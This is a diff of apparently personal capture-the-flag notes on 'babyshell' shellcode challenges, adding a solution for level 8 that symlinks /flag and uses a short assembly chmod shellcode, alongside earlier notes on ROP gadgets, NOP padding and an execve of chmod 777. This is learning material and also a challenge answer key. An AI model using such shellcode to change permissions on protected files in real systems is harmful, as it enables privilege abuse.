@@ -10,4 +10,15 @@
     - One solution is to find an *ROP gadget* in the binary of the challenge program, or the libraries it loads. What we want to find is `syscall; ret;` (`0f05c3`), before we jump to the `syscall`, we can push current `rip` on to the stack, such that after the system call, `ret` will jump back. But since the address of the program in `gdb` is slightly different from running the program directly, this solution is not easy
     - Another solution is straightforward, we pad 4096 NOPs (`0x90`) at the beginning of our shellcode, so that the bytes `0e05` is at a writable memory address, we can make them `0f05` at runtime
 - *babyshell_lv7*: all file descriptors are closed, so we cannot directly open and send `/flag` to the standard output. But what we can do is change the permission of `/flag`: `execve("/bin/chmod", {"/bin/chmod", "777", "/flag", NULL}, NULL)`. We can store the data on the stack or at the end of our shellcode
-- *babyshell_lv8*
+- *babyshell_lv8*: this time, the challenge program only accept the first 18 bytes of our shellcode. Use `chmod(const char* pathname, mode_t mode)` system call, to save space, we should choose a short file name (and create a symbolic link to `/flag`)
+    1. `ln -sf /flag Z` (choose `Z` because it is `90` (`0x5a`), the same as the number of `chmod` system call, we can reuse it)
+    2. the shellcode generated from:
+        ```
+        mov al, 90
+        push rax
+        mov rdi, rsp
+        mov rsi, 7
+        syscall
+        ```
+    3. input the shellcode to the challenge program, it will modify the permission of `/flag` (for all other users) to `7` (`rwx`), then we can read the flag
+- *babyshell_lv9*
